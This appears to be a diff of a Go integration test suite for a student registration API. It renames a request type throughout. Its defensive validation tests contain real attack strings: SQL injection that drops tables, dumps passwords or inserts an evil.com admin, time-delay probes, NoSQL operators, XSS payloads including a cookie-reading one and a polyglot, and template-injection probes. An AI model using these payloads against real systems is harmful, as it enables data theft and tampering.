@@ -80,7 +80,7 @@ func (s *RegistrationIntegrationSuite) TestStudentRegistrationFlow() {
 	})
 
 	s.T().Run("Complete Student Registration", func(t *testing.T) {
-		s.HTTP.CompleteStudentRegistration(t, registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		s.HTTP.CompleteStudentRegistration(t, registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: reg.GetVerificationCode(),
 			Password:         fixtures.TestStudent.Password,
@@ -285,7 +285,7 @@ func (s *RegistrationIntegrationSuite) TestCompleteRegistrationValidation() {
 		email := "weak-password@test.com"
 		s.setupVerifiedRegistration(email)
 
-		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: s.getVerificationCode(email),
 			Password:         "weak",
@@ -305,7 +305,7 @@ func (s *RegistrationIntegrationSuite) TestCompleteRegistrationValidation() {
 		s.DB.SeedUser(s.T(), student.User())
 		s.DB.SeedStudent(s.T(), student.User().ID(), fixtures.SEGroup.ID)
 
-		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: s.getVerificationCode(email),
 			Password:         fixtures.TestStudent.Password,
@@ -322,7 +322,7 @@ func (s *RegistrationIntegrationSuite) TestCompleteRegistrationValidation() {
 		s.setupVerifiedRegistration(email)
 		invalidGroupID := uuid.New()
 
-		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: s.getVerificationCode(email),
 			Password:         fixtures.TestStudent.Password,
@@ -343,7 +343,7 @@ func (s *RegistrationIntegrationSuite) TestRegistrationStates() {
 		s.HTTP.StartStudentRegistration(t, email).AssertAccepted()
 		reg := s.DB.RequireRegistrationExists(t, email)
 
-		s.HTTP.CompleteStudentRegistration(t, registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		s.HTTP.CompleteStudentRegistration(t, registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: reg.GetVerificationCode(),
 			Password:         fixtures.TestStudent.Password,
@@ -359,7 +359,7 @@ func (s *RegistrationIntegrationSuite) TestRegistrationStates() {
 		email := "double-complete@test.com"
 		s.setupCompletedRegistration(email)
 
-		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: s.getVerificationCode(email),
 			Password:         fixtures.TestStudent.Password,
@@ -383,7 +383,7 @@ func (s *RegistrationIntegrationSuite) TestBusinessRules() {
 		email := "names@test.com"
 		s.setupVerifiedRegistration(email)
 
-		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: s.getVerificationCode(email),
 			Password:         fixtures.TestStudent.Password,
@@ -401,14 +401,14 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 
 	tests := []struct {
 		name           string
-		setup          func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody)
+		setup          func(req *registrationhttp.CompleteStudentRegistrationRequest)
 		expectedStatus int
 		message        string
 		setupBefore    bool
 	}{
 		{
 			name: "Empty Email",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = ""
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -416,7 +416,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Invalid Email Format",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "invalid-email"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -424,7 +424,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Empty Verification Code",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.VerificationCode = ""
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -432,7 +432,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Empty Password",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Password = ""
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -440,7 +440,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Empty Barcode",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = ""
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -448,7 +448,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Invalid Barcode Format",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "INVALID-BARCODE"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -457,7 +457,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Empty First Name",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = ""
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -465,7 +465,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Empty Last Name",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = ""
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -473,7 +473,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Invalid Group ID",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.GroupId = uuid.New()
 			},
 			expectedStatus: http.StatusNotFound,
@@ -481,14 +481,14 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Group ID Not Provided",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.GroupId = uuid.Nil
 			},
 			expectedStatus: http.StatusBadRequest,
 		},
 		{
 			name: "Group ID Not Found",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.GroupId = uuid.New()
 			},
 			expectedStatus: http.StatusNotFound,
@@ -497,7 +497,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		// Password validation test cases
 		{
 			name: "Password Too Short",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Password = "Pass1!"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -505,7 +505,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Password Too Long",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Password = strings.Repeat("Password1!", 15) // 150 characters
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -513,7 +513,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Password Missing Uppercase",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Password = "password123!"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -521,7 +521,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Password Missing Lowercase",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Password = "PASSWORD123!"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -529,7 +529,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Password Missing Number",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Password = "Password!"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -537,7 +537,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Password Missing Special Character",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Password = "Password123"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -546,7 +546,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		// Name validation test cases
 		{
 			name: "First Name Too Long",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = strings.Repeat("A", 151)
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -554,7 +554,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Last Name Too Long",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = strings.Repeat("B", 151)
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -562,7 +562,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "First Name Invalid Characters",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "John123"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -570,7 +570,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Last Name Invalid Characters",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "Smith@#$"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -579,7 +579,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		// valid names with special characters
 		{
 			name: "First Name With Valid Special Characters",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU001"
 				req.Email = "valid-firstname-1@test.com"
 				req.FirstName = "Jean-Pierre"
@@ -589,7 +589,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Last Name With Apostrophe",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU002"
 				req.Email = "valid-lastname-1@test.com"
 				req.LastName = "O'Connor"
@@ -600,7 +600,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		// Email validation edge cases
 		{
 			name: "Email Too Long",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				longEmail := strings.Repeat("a", 250) + "@test.com"
 				req.Email = longEmail
 			},
@@ -609,7 +609,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Email Too Short",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "a@b"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -618,7 +618,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		// Barcode validation edge cases
 		{
 			name: "Barcode Too Long",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = strings.Repeat("A", 21) // Over typical barcode length
 				req.Email = "barcode-too-long@test.com"
 			},
@@ -628,7 +628,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Barcode With Spaces",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU 001"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -637,7 +637,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Barcode With Unicode Characters",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STUদেন্ট001"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -646,7 +646,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Null Bytes in Barcode",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU001\x00admin"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -656,7 +656,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		// Verification code edge cases
 		{
 			name: "Verification Code Too Long",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.VerificationCode = strings.Repeat("1", 20)
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -664,7 +664,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 		},
 		{
 			name: "Verification Code With Special Characters",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.VerificationCode = "123@#$"
 			},
 			expectedStatus: http.StatusBadRequest,
@@ -674,7 +674,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestV
 
 	for _, tt := range tests {
 		s.T().Run(tt.name, func(t *testing.T) {
-			request := registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+			request := registrationhttp.CompleteStudentRegistrationRequest{
 				Email:            fixtures.TestStudent.Email,
 				VerificationCode: "123456",
 				Password:         fixtures.TestStudent.Password,
@@ -705,13 +705,13 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 
 	tests := []struct {
 		name            string
-		setup           func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody)
+		setup           func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest)
 		expectedStatus  int
 		expectedMessage string
 	}{
 		{
 			name: "Registration Not Found",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "nonexistent@test.com"
 				req.VerificationCode = "123456"
 				req.Barcode = "110011"
@@ -722,7 +722,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 		},
 		{
 			name: "Email Not Verified First",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				email := "not-verified@test.com"
 				s.HTTP.StartStudentRegistration(t, email).AssertAccepted()
 				reg := s.DB.RequireRegistrationExists(t, email)
@@ -736,7 +736,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 		},
 		{
 			name: "Invalid Verification Code",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				email := "invalid-code@test.com"
 				s.HTTP.StartStudentRegistration(t, email).AssertAccepted()
 				s.DB.RequireRegistrationExists(t, email)
@@ -751,7 +751,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 		},
 		{
 			name: "Invalid Verification Code Length",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				email := "invalid-code-length@test.com"
 				s.setupVerifiedRegistration(email)
 				req.Email = email
@@ -764,7 +764,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 		},
 		{
 			name: "Registration Already Completed",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				email := "completed@test.com"
 				s.setupCompletedRegistration(email)
 
@@ -778,7 +778,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 		},
 		{
 			name: "Duplicate Student Barcode",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				email := "duplicate-barcode@test.com"
 				s.setupVerifiedRegistration(email)
 
@@ -797,7 +797,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 		},
 		{
 			name: "User Already Exists With Email",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				email := "existing-user@test.com"
 				s.setupVerifiedRegistration(email)
 
@@ -816,7 +816,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 		},
 		{
 			name: "Username already Taken",
-			setup: func(t *testing.T, req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
 				email := "username-taken@test.com"
 				s.setupVerifiedRegistration(email)
 
@@ -836,7 +836,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Business
 
 	for _, tt := range tests {
 		s.T().Run(tt.name, func(t *testing.T) {
-			req := registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+			req := registrationhttp.CompleteStudentRegistrationRequest{
 				Email:            "",
 				VerificationCode: "",
 				Password:         fixtures.TestStudent.Password,
@@ -868,7 +868,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Verifica
 		expiredReg := s.Builder.Registration.ExpiredRegistration(email)
 		s.DB.SeedRegistration(t, expiredReg)
 
-		response := s.HTTP.CompleteStudentRegistration(t, registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+		response := s.HTTP.CompleteStudentRegistration(t, registrationhttp.CompleteStudentRegistrationRequest{
 			Email:            email,
 			VerificationCode: expiredReg.VerificationCode(),
 			Password:         fixtures.TestStudent.Password,
@@ -890,33 +890,33 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Security
 
 	tests := []struct {
 		name    string
-		setup   func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody)
+		setup   func(req *registrationhttp.CompleteStudentRegistrationRequest)
 		message string
 	}{
 		{
 			name: "SQL Injection in Email",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "test'; DROP TABLE users; --@test.com"
 			},
 			message: "Email Address must be a valid email address",
 		},
 		{
 			name: "XSS in First Name",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "<script>alert('xss')</script>"
 			},
 			message: "must be a valid name",
 		},
 		{
 			name: "XSS in Last Name",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "<img src=x onerror=alert('xss')>"
 			},
 			message: "must be a valid name",
 		},
 		{
 			name: "HTML Entities in Name",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "&lt;script&gt;alert('test')&lt;/script&gt;"
 			},
 			message: "must be a valid name",
@@ -925,7 +925,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Security
 
 	for _, tt := range tests {
 		s.T().Run(tt.name, func(t *testing.T) {
-			request := registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+			request := registrationhttp.CompleteStudentRegistrationRequest{
 				Email:            fixtures.TestStudent.Email,
 				VerificationCode: "123456",
 				Password:         fixtures.TestStudent.Password,
@@ -949,7 +949,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 	// Modern and comprehensive injection test vectors
 	tests := []struct {
 		name            string
-		setup           func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody)
+		setup           func(req *registrationhttp.CompleteStudentRegistrationRequest)
 		expectedStatus  int
 		expectedMessage string
 		description     string
@@ -959,7 +959,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Advanced SQL Injection Variants
 		{
 			name: "Blind SQL Injection with Time Delay",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "test@test.com'; WAITFOR DELAY '00:00:05'--"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -968,7 +968,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Union-based SQL Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "John' UNION SELECT username, password FROM users--"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -977,7 +977,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Stacked Queries SQL Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "Smith'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'admin')--"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -987,7 +987,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		{
 			name:        "Second Order SQL Injection",
 			description: "Second order SQL injection payload, must be sanitized on database level",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "admin'--"
 			},
 			expectedStatus: http.StatusOK,
@@ -998,7 +998,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "PostgreSQL Specific SQL Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Barcode = "STU001'||pg_sleep(5)||'"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1009,7 +1009,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// NoSQL Injection Patterns
 		{
 			name: "MongoDB NoSQL Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.Email = "{\"$ne\":null}@test.com"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1018,7 +1018,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "JSON NoSQL Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "{\"$gt\":\"\"}"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1029,7 +1029,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Advanced XSS Variants
 		{
 			name: "DOM-based XSS with Event Handler",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "<div onmouseover=\"alert(document.cookie)\">Name</div>"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1038,7 +1038,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "XSS with SVG Payload",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "<svg onload=alert('XSS')>"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1047,7 +1047,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "XSS with Data URI",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click</a>"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1056,7 +1056,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Polyglot XSS Payload",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1065,7 +1065,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "XSS with JavaScript Protocol",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "javascript:alert(1)"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1076,7 +1076,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Template Injection
 		{
 			name: "Server-Side Template Injection (SSTI)",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.FirstName = "{{7*7}}"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1085,7 +1085,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		},
 		{
 			name: "Jinja2 Template Injection",
-			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
 				req.LastName = "{{ config.items() }}"
 			},
 			expectedStatus:  http.StatusBadRequest,
@@ -1096,7 +1096,7 @@ func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors
 		// Command Injection
 		{
 			name: "OS Command Injection with Semicolon",
